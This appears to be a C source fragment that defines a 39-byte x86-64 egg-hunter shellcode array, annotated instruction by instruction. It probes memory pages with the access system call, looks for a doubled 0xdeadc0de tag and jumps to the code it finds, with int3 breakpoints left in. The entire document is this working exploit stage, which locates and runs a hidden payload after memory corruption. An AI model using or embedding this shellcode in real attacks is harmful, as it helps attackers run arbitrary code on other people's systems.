
#define EGG_SIZE 39

char EGG[] = {
  /* 0000 */ "\xcc"                 /* int3                */
  /* 0001 */ "\x31\xff"             /* xor edi, edi        */
  /* 0003 */ "\xf7\xe7"             /* mul edi             */
  /* 0005 */ "\x96"                 /* xchg esi, eax       */
  /* 0006 */ "\xb6\x10"             /* mov dh, 0x10        */
  /* 0008 */ "\x48\x01\xd7"         /* add rdi, rdx        */
  /* 000B */ "\x57"                 /* push rdi            */
  /* 000C */ "\x83\xc7\x04"         /* add edi, 0x4        */
  /* 000F */ "\x6a\x15"             /* push 0x15           */
  /* 0011 */ "\x58"                 /* pop rax             */
  /* 0012 */ "\x0f\x05"             /* syscall             */
  /* 0014 */ "\x5f"                 /* pop rdi             */
  /* 0015 */ "\x3c\xf2"             /* cmp al, 0xf2        */
  /* 0017 */ "\x74\xef"             /* jz 0x8              */
  /* 0019 */ "\xcc"                 /* int3                */
  /* 001A */ "\xb8\xde\xc0\xad\xde" /* mov eax, 0xdeadc0de */
  /* 001F */ "\xaf"                 /* scasd               */
  /* 0020 */ "\x75\xe9"             /* jnz 0xb             */
  /* 0022 */ "\xaf"                 /* scasd               */
  /* 0023 */ "\x75\xe6"             /* jnz 0xb             */
  /* 0025 */ "\xff\xe7"             /* jmp rdi             */
};